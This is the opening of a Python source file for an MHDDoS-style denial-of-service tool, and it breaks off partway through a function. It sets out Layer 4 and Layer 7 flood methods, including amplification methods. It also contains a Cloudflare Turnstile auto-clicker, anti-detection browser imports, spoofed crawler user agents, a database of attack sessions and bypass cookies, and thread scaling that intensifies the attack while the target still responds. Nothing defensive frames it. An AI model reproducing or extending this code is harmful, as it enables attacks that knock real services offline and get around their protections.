#!/usr/bin/env python3

import asyncio
import json
import logging
import random
import re
import sqlite3
import ssl
import sys

if sys.stdout and sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if sys.stderr and sys.stderr.encoding and sys.stderr.encoding.lower() != 'utf-8':
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from datetime import datetime, timedelta
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    IPPROTO_ICMP,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    gethostbyname,
    gethostname,
    socket,
)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread, Lock, RLock, current_thread
from time import sleep, time
from typing import Any, List, Set, Tuple, Optional, Union, Dict
from urllib import parse
from urllib.parse import urlparse
from uuid import UUID, uuid4
import traceback
from src.core.debugger import BypassDebugger
from src.core.proxy_guard import ProxyCircuitBreaker

import psutil
import requests
import aiohttp
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, get, cookies
from yarl import URL

try:
    import nodriver
    NODRIVER_INSTALLED = True
except ImportError:
    NODRIVER_INSTALLED = False

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    PLAYWRIGHT_INSTALLED = True
except ImportError:
    PLAYWRIGHT_INSTALLED = False

try:
    from playwright_stealth import Stealth
    STEALTH_INSTALLED = True
except ImportError:
    STEALTH_INSTALLED = False

try:
    from curl_cffi.requests import AsyncSession as CurlSession
    CURL_CFFI_INSTALLED = True
except ImportError:
    CURL_CFFI_INSTALLED = False

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
    DRISSION_INSTALLED = True
except ImportError:
    DRISSION_INSTALLED = False

try:
    import httpx
    HTTPX_INSTALLED = True
except ImportError:
    HTTPX_INSTALLED = False

try:
    from camoufox.sync_api import Camoufox
    CAMOUFOX_INSTALLED = True
except ImportError:
    CAMOUFOX_INSTALLED = False

try:
    from patchright.sync_api import sync_playwright as patchright_sync
    PATCHRIGHT_INSTALLED = True
except ImportError:
    PATCHRIGHT_INSTALLED = False

try:
    from cloakbrowser import launch as cloakbrowser_launch
    CLOAKBROWSER_INSTALLED = True
except ImportError:
    CLOAKBROWSER_INSTALLED = False

try:
    from botasaurus.browser import browser, Driver
    BOTASAURUS_INSTALLED = True
except ImportError:
    BOTASAURUS_INSTALLED = False

try:
    import undetected_chromedriver as uc_chrome
    UNDETECTED_CHROMEDRIVER_INSTALLED = True
except ImportError:
    UNDETECTED_CHROMEDRIVER_INSTALLED = False

# --- Windows asyncio Proactor OSError 10057 Workaround ---
if sys.platform.lower().startswith("win") and sys.version_info >= (3, 8):
    try:
        from functools import wraps
        from asyncio.proactor_events import _ProactorBasePipeTransport
        
        def silence_win_error_10057(func):
            @wraps(func)
            def wrapper(self, *args, **kwargs):
                try:
                    return func(self, *args, **kwargs)
                except OSError as e:
                    if getattr(e, 'winerror', None) == 10057:
                        return
                    raise
            return wrapper

        _ProactorBasePipeTransport._call_connection_lost = silence_win_error_10057(
            _ProactorBasePipeTransport._call_connection_lost
        )
    except Exception:
        pass

# --- Asyncio StreamWriter Context Manager Patch ---
async def _streamwriter_aenter(self):
    return self

async def _streamwriter_aexit(self, exc_type, exc_val, exc_tb):
    try:
        self.close()
        await self.wait_closed()
    except Exception:
        pass

asyncio.StreamWriter.__aenter__ = _streamwriter_aenter
asyncio.StreamWriter.__aexit__ = _streamwriter_aexit

# --- Tactical Configuration (v1.2.1) ---
__version__: str = "1.2.1"
try:
    from src.core.paths import get_project_root, get_bin_path, get_data_path, get_logs_path, get_assets_path
except ImportError:
    # Fallback for direct execution if PYTHONPATH is not set
    import sys
    from pathlib import Path
    sys.path.append(str(Path(__file__).resolve().parent.parent.parent))
    from src.core.paths import get_project_root, get_bin_path, get_data_path, get_logs_path, get_assets_path

__dir__: Path = get_project_root()

# Setup High-Signal Logging
from logging.handlers import RotatingFileHandler
import os

log_dir = get_logs_path()
log_dir.mkdir(parents=True, exist_ok=True)
log_file = log_dir / "mhddos_headless.log"

formatter = logging.Formatter("[%(asctime)s - %(levelname)s] %(message)s", "%H:%M:%S")

# File handler with rotation (10 MB max size, keep 5 backups)
file_handler = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5, encoding="utf-8")
file_handler.setFormatter(formatter)

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(formatter)

logger = getLogger("MHDDoS")
logger.handlers.clear()
logger.addHandler(console_handler)
logger.addHandler(file_handler)

if "--debug" in argv or "--verbose" in argv:
    logger.setLevel(logging.DEBUG)
    logger.debug("[*] VERBOSE DIAGNOSTICS ENABLED: Deep tactical tracing active.")
else:
    logger.setLevel(logging.INFO)

# Silence library noise for maximum tactical focus
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2


__ip__: Any = None
tor2webs = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.sh",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]

with open(get_data_path() / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    try:
        s.connect(("8.8.8.8", 80))
        __ip__ = s.getsockname()[0]
    except OSError:
        __ip__ = "127.0.0.1"


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def exit(*message: str) -> None:
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    # Ensure logs reach the pipe before we kill the process tree
    sys.stdout.flush()
    sys.stderr.flush()
    import os
    os._exit(1)


# --- Persistent Intelligence Database ---
class IntelligenceDB:
    def __init__(self, db_path: str = None):
        if db_path is None:
            db_path = get_data_path() / "assets" / "intelligence.db"
        else:
            db_path = Path(db_path)
        self.db_path = db_path
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.lock = Lock()
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path, timeout=30.0) as conn:
            cursor = conn.cursor()
            # Enable WAL mode for multi-process concurrency
            cursor.execute('PRAGMA journal_mode=WAL;')
            cursor.execute('PRAGMA synchronous=NORMAL;')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxy_intel (
                    ip_port TEXT PRIMARY KEY,
                    latency REAL,
                    score REAL,
                    failures INTEGER,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # --- Attack History Tables ---
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    session_id TEXT PRIMARY KEY,
                    target TEXT NOT NULL,
                    method TEXT NOT NULL,
                    threads INTEGER,
                    duration_planned INTEGER,
                    duration_actual REAL,
                    proxy_type TEXT,
                    proxy_count INTEGER DEFAULT 0,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    exit_status TEXT DEFAULT 'running',
                    total_requests INTEGER DEFAULT 0,
                    total_bytes INTEGER DEFAULT 0,
                    avg_latency REAL DEFAULT 0.0,
                    peak_pps INTEGER DEFAULT 0,
                    peak_bps INTEGER DEFAULT 0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    pps INTEGER DEFAULT 0,
                    bps INTEGER DEFAULT 0,
                    latency REAL DEFAULT 0.0,
                    cpu_percent REAL DEFAULT 0.0,
                    ram_percent REAL DEFAULT 0.0,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    event_type TEXT NOT NULL,
                    message TEXT,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bypass_intelligence (
                    target TEXT PRIMARY KEY,
                    cookie TEXT,
                    ua TEXT,
                    ja3 TEXT,
                    headers TEXT,
                    last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # Index for fast time-range queries on metrics
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_metrics_session_time 
                ON attack_metrics(session_id, timestamp)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_events_session 
                ON attack_events(session_id)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_sessions_start_time 
                ON attack_sessions(start_time)
            ''')
            conn.commit()

    # --- Proxy Intel Methods (existing) ---

    def update_proxy_scores(self, proxies: List['TacticalProxy']):
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                for p in proxies:
                    cursor.execute('''
                        INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
                        VALUES (?, ?, ?, ?, ?)
                        ON CONFLICT(ip_port) DO UPDATE SET
                            latency=excluded.latency,
                            score=excluded.score,
                            failures=failures + excluded.failures,
                            last_seen=excluded.last_seen
                    ''', (str(p.base), p.latency_ms, p.score, p.total_fails, now))
                conn.commit()

    def get_proxy_intel(self, ip_port: str) -> Optional[Dict]:
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
                row = cursor.fetchone()
                if row:
                    return {'latency': row[0], 'score': row[1], 'failures': row[2]}
        return None

    def get_bulk_proxy_intel(self, ip_ports: List[str]) -> Dict[str, Dict]:
        results = {}
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                # Chunking the IN clause to avoid sqlite limits
                chunk_size = 900
                for i in range(0, len(ip_ports), chunk_size):
                    chunk = ip_ports[i:i + chunk_size]
                    placeholders = ','.join(['?'] * len(chunk))
                    cursor.execute(f'SELECT ip_port, latency, score, failures FROM proxy_intel WHERE ip_port IN ({placeholders})', chunk)
                    for row in cursor.fetchall():
                        results[row[0]] = {'latency': row[1], 'score': row[2], 'failures': row[3]}
        return results

    def update_bypass_intel(self, target: str, cookie: str = None, ua: str = None, ja3: str = None, headers: str = None):
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                cursor.execute('''
                    INSERT INTO bypass_intelligence (target, cookie, ua, ja3, headers, last_updated)
                    VALUES (?, ?, ?, ?, ?, ?)
                    ON CONFLICT(target) DO UPDATE SET
                        cookie=COALESCE(excluded.cookie, cookie),
                        ua=COALESCE(excluded.ua, ua),
                        ja3=COALESCE(excluded.ja3, ja3),
                        headers=COALESCE(excluded.headers, headers),
                        last_updated=excluded.last_updated
                ''', (target, cookie, ua, ja3, headers, now))
                conn.commit()

    def get_bypass_intel(self, target: str) -> Optional[Dict]:
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM bypass_intelligence WHERE target=?', (target,))
                row = cursor.fetchone()
                return dict(row) if row else None

    # --- Attack History Methods ---

    def create_session(self, session_id: str, target: str, method: str,
                       threads: int, duration: int, proxy_type: str = "",
                       proxy_count: int = 0) -> None:
        """Record a new attack session at launch time."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                cursor.execute('''
                    INSERT OR REPLACE INTO attack_sessions 
                    (session_id, target, method, threads, duration_planned, 
                     proxy_type, proxy_count, start_time, exit_status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running')
                ''', (session_id, target, method, threads, duration,
                      proxy_type, proxy_count, now))
                conn.commit()
                self.record_event(session_id, 'start',
                                  f'Attack initiated: {method} -> {target} ({threads} threads, {duration}s)',
                                  _use_lock=False, _conn=conn)

    def record_metric(self, session_id: str, pps: int, bps: int,
                      latency: float, cpu_pct: float = 0.0,
                      ram_pct: float = 0.0) -> None:
        """Record a single time-series data point (called every ~1s)."""
        with self.lock:
            try:
                with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                    cursor = conn.cursor()
                    now = datetime.now().isoformat()
                    cursor.execute('''
                        INSERT INTO attack_metrics 
                        (session_id, timestamp, pps, bps, latency, cpu_percent, ram_percent)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (session_id, now, pps, bps, latency, cpu_pct, ram_pct))
                    conn.commit()
            except Exception:
                pass  # Non-blocking: never crash the engine for telemetry

    def record_event(self, session_id: str, event_type: str, message: str,
                     _use_lock: bool = True, _conn=None) -> None:
        """Record a significant event during an attack."""
        def _insert(conn):
            cursor = conn.cursor()
            now = datetime.now().isoformat()
            cursor.execute('''
                INSERT INTO attack_events (session_id, timestamp, event_type, message)
                VALUES (?, ?, ?, ?)
            ''', (session_id, now, event_type, message))
            conn.commit()

        try:
            if _conn:
                _insert(_conn)
            else:
                if _use_lock:
                    with self.lock:
                        with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                            _insert(conn)
                else:
                    with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                        _insert(conn)
        except Exception:
            pass

    def finalize_session(self, session_id: str, exit_status: str = 'completed') -> None:
        """Finalize a session with aggregated stats when attack ends."""
        with self.lock:
            try:
                with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                    cursor = conn.cursor()
                    now = datetime.now().isoformat()
                    # Calculate aggregates from recorded metrics
                    cursor.execute('''
                        SELECT 
                            COALESCE(SUM(pps), 0),
                            COALESCE(SUM(bps), 0),
                            COALESCE(AVG(CASE WHEN latency > 0 THEN latency END), 0.0),
                            COALESCE(MAX(pps), 0),
                            COALESCE(MAX(bps), 0)
                        FROM attack_metrics WHERE session_id = ?
                    ''', (session_id,))
                    row = cursor.fetchone()
                    total_req, total_bytes, avg_lat, peak_pps, peak_bps = row if row else (0, 0, 0.0, 0, 0)

                    # Calculate actual duration
                    cursor.execute('''
                        SELECT start_time FROM attack_sessions WHERE session_id = ?
                    ''', (session_id,))
                    start_row = cursor.fetchone()
                    duration_actual = 0.0
                    if start_row and start_row[0]:
                        try:
                            start_dt = datetime.fromisoformat(start_row[0])
                            duration_actual = (datetime.now() - start_dt).total_seconds()
                        except Exception:
                            pass

                    cursor.execute('''
                        UPDATE attack_sessions SET
                            end_time = ?,
                            exit_status = ?,
                            duration_actual = ?,
                            total_requests = ?,
                            total_bytes = ?,
                            avg_latency = ?,
                            peak_pps = ?,
                            peak_bps = ?
                        WHERE session_id = ?
                    ''', (now, exit_status, duration_actual, total_req, total_bytes,
                          avg_lat, peak_pps, peak_bps, session_id))
                    conn.commit()
                    self.record_event(session_id, 'end',
                                      f'Attack {exit_status}: duration={duration_actual:.1f}s, '
                                      f'total_req={total_req}, total_bytes={total_bytes}',
                                      _use_lock=False, _conn=conn)
            except Exception as e:
                logger.debug(f"[!] History DB finalize error: {e}")

    def get_session_list(self, limit: int = 50, offset: int = 0) -> List[Dict]:
        """Return a list of past attack sessions, newest first."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT * FROM attack_sessions 
                    ORDER BY start_time DESC LIMIT ? OFFSET ?
                ''', (limit, offset))
                return [dict(row) for row in cursor.fetchall()]

    def get_session_detail(self, session_id: str) -> Optional[Dict]:
        """Return full details for a single session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM attack_sessions WHERE session_id = ?', (session_id,))
                row = cursor.fetchone()
                return dict(row) if row else None

    def get_session_metrics(self, session_id: str) -> List[Dict]:
        """Return time-series metrics for a session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT timestamp, pps, bps, latency, cpu_percent, ram_percent
                    FROM attack_metrics WHERE session_id = ?
                    ORDER BY timestamp ASC
                ''', (session_id,))
                return [dict(row) for row in cursor.fetchall()]

    def get_session_events(self, session_id: str) -> List[Dict]:
        """Return event log for a session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT timestamp, event_type, message
                    FROM attack_events WHERE session_id = ?
                    ORDER BY timestamp ASC
                ''', (session_id,))
                return [dict(row) for row in cursor.fetchall()]

    def get_global_stats(self) -> Dict:
        """Return global attack statistics."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT COUNT(*) FROM attack_sessions')
                total_sessions = cursor.fetchone()[0]
                cursor.execute('SELECT COUNT(*) FROM attack_sessions WHERE exit_status = "completed"')
                completed = cursor.fetchone()[0]
                cursor.execute('''
                    SELECT method, COUNT(*) as cnt FROM attack_sessions 
                    GROUP BY method ORDER BY cnt DESC LIMIT 1
                ''')
                top_method_row = cursor.fetchone()
                top_method = top_method_row[0] if top_method_row else "N/A"
                cursor.execute('''
                    SELECT COALESCE(SUM(total_requests), 0), 
                           COALESCE(SUM(total_bytes), 0),
                           COALESCE(AVG(duration_actual), 0)
                    FROM attack_sessions WHERE exit_status != 'running'
                ''')
                agg = cursor.fetchone()
                return {
                    'total_sessions': total_sessions,
                    'completed_sessions': completed,
                    'top_method': top_method,
                    'lifetime_requests': agg[0],
                    'lifetime_bytes': agg[1],
                    'avg_duration': round(agg[2], 1),
                }

    def delete_session(self, session_id: str) -> bool:
        """Delete a session and all related metrics/events."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM attack_metrics WHERE session_id = ?', (session_id,))
                cursor.execute('DELETE FROM attack_events WHERE session_id = ?', (session_id,))
                cursor.execute('DELETE FROM attack_sessions WHERE session_id = ?', (session_id,))
                conn.commit()
                return cursor.rowcount > 0

    def cleanup_old_data(self, days: int = 30) -> int:
        """Auto-purge attack metrics older than N days. Keep session summaries."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cutoff = (datetime.now() - timedelta(days=days)).isoformat()
                # Delete old metrics (heavy data) but keep session summaries
                cursor.execute('''
                    DELETE FROM attack_metrics WHERE session_id IN (
                        SELECT session_id FROM attack_sessions WHERE start_time < ?
                    )
                ''', (cutoff,))
                metrics_deleted = cursor.rowcount
                cursor.execute('''
                    DELETE FROM attack_events WHERE session_id IN (
                        SELECT session_id FROM attack_sessions WHERE start_time < ?
                    )
                ''', (cutoff,))
                # Delete very old sessions entirely (older than 2x retention)
                very_old = (datetime.now() - timedelta(days=days * 2)).isoformat()
                cursor.execute('DELETE FROM attack_sessions WHERE start_time < ?', (very_old,))
                conn.commit()
                if metrics_deleted > 0:
                    logger.info(f"{bcolors.OKCYAN}[*] History DB: Auto-cleanup purged {metrics_deleted} old metric records.{bcolors.RESET}")
                return metrics_deleted


class HistoryCleanupDaemon(Thread):
    """Background thread that runs cleanup every 24 hours."""
    def __init__(self, db: IntelligenceDB, retention_days: int = 30):
        Thread.__init__(self, daemon=True)
        self.db = db
        self.retention_days = retention_days

    def run(self):
        # Initial cleanup on startup
        sleep(10)
        self.db.cleanup_old_data(self.retention_days)
        while True:
            sleep(86400)  # 24 hours
            self.db.cleanup_old_data(self.retention_days)


INTEL_DB = IntelligenceDB()
# Start background cleanup daemon (30-day retention)
HistoryCleanupDaemon(INTEL_DB, retention_days=30).start()

# --- Dynamic Scaling Globals ---
class EngineState:
    def __init__(self):
        self.active_threads_target = RawValue("i", 0)
        self.max_threads = 0
        self.flaresolverr_url: str | None = None

ENGINE_STATE = EngineState()


def get_max_ram_threshold(platform_name: str = sys.platform) -> float:
    """Return OS-calibrated maximum RAM threshold before triggering worker downscaling."""
    if platform_name == "win32":
        return 94.0
    return 85.0


def get_optimal_ram_threshold(platform_name: str = sys.platform) -> float:
    """Return OS-calibrated optimal RAM threshold for worker upscaling."""
    if platform_name == "win32":
        return 75.0
    return 60.0


class DynamicScaler(Thread):
    def __init__(self, target_host: str, interval: int = 5):
        Thread.__init__(self, daemon=True)
        self.interval = interval
        self.target_host = target_host
        self.consecutive_high_load = 0
        self.consecutive_low_load = 0

    def run(self):
        while True:
            sleep(self.interval)
            cpu = cpu_percent(interval=1)
            mem = virtual_memory().percent
            lat = CURRENT_LATENCY.value
            current_target = ENGINE_STATE.active_threads_target.value

            max_ram = get_max_ram_threshold()
            opt_ram = get_optimal_ram_threshold()

            # Downscale if host is struggling (CPU > 85% or RAM > max_ram or Latency Timeout)
            if cpu > 85 or mem > max_ram or lat == -1.0:
                self.consecutive_high_load += 1
                self.consecutive_low_load = 0
                if self.consecutive_high_load >= 2:
                    new_target = max(10, int(current_target * 0.8)) # Drop by 20%
                    if new_target < current_target:
                        logger.warning(f"{bcolors.WARNING}[!] Dynamic Scaler: High load detected (CPU: {cpu}%, RAM: {mem}% / Threshold: {max_ram}%). Downscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_high_load = 0
            
            # Upscale if host is bored and target is responding well (CPU < 50%, RAM < opt_ram, Latency < 1000ms)
            elif cpu < 50 and mem < opt_ram and 0 < lat < 1000:
                self.consecutive_low_load += 1
                self.consecutive_high_load = 0
                if self.consecutive_low_load >= 3:
                    new_target = min(ENGINE_STATE.max_threads, int(current_target * 1.1) + 10) # Increase by 10%
                    if new_target > current_target:
                        logger.info(f"{bcolors.OKCYAN}[*] Dynamic Scaler: System optimal. Upscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_low_load = 0
            else:
                self.consecutive_high_load = 0
                self.consecutive_low_load = 0


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "BOT",
        "BOMB",
        "DOWNLOADER",
        "KILLER",
        "TOR",
        "RHEX",
        "STOMP",
        "IMPERSONATE",
        "HTTP3",
        "H2FLOOD",
        "BEHAVIOR",
        "ADAPTIVE",
        "BROWSER",
        "HYBRID",
    }

    LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP,
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "FIVEM-TOKEN",
        "TS3",
        "MCPE",
        "ICMP",
        "OVH-UDP",
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
]


class Counter:
    def __init__(self, value: int = 0) -> None:
        self._value = RawValue("Q", value) # Use Unsigned Long Long (64-bit) for BPS/PPS
        self._lock = Lock()

    def __iadd__(self, value: int) -> "Counter":
        with self._lock:
            self._value.value += value
        return self

    def __int__(self) -> int:
        with self._lock:
            return self._value.value

    def set(self, value: int) -> "Counter":
        with self._lock:
            self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
SUCCESS_SENT = Counter() # 2xx/3xx
WAF_SENT = Counter()     # 4xx (Blocked/Mitigated)
ERROR_SENT = Counter()   # 5xx (Server Crash)
TIMEOUT_SENT = Counter() # Socket Timeouts
CURRENT_LATENCY = RawValue("d", 0.0)
DYNAMIC_RPC = RawValue("i", 100)


async def resolve_turnstile_challenge(page: Any, timeout: int = 15000) -> bool:
    """
    Resolves Cloudflare Turnstile challenge by waiting for Shadow DOM rendering
    and verifying bounding box height > 0 before interacting.
    """
    try:
        await page.wait_for_selector("#turnstile-wrapper iframe", state="visible", timeout=timeout)
        
        max_attempts = 5
        for attempt in range(max_attempts):
            box = await page.evaluate("""() => {
                const el = document.querySelector("#turnstile-wrapper iframe");
                return el ? el.getBoundingClientRect() : {height: 0};
            }""")
            
            if box and box.get("height", 0) > 0:
                break
                
            # Force layout reflow if element height is 0
            await page.set_viewport_size({"width": 1920, "height": 1080})
            await asyncio.sleep(1.0)
        else:
            return False
            
        frame = page.frame_locator("#turnstile-wrapper iframe")
        checkbox = frame.locator("input[type='checkbox'], .cb-lb")
        
        # Add entropy jitter before clicking
        await asyncio.sleep(random.uniform(0.2, 0.6))
        await checkbox.click(delay=random.randint(120, 300))
        return True
    except Exception:
        return False


async def _check_target_latency_once(scheme: str, target_host: str, port: int, timeout: int) -> None:
    """Helper to perform a single latency check with WAF challenge detection."""
    import aiohttp
    from time import time
    start_t = time()
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            client_timeout = aiohttp.ClientTimeout(total=timeout)
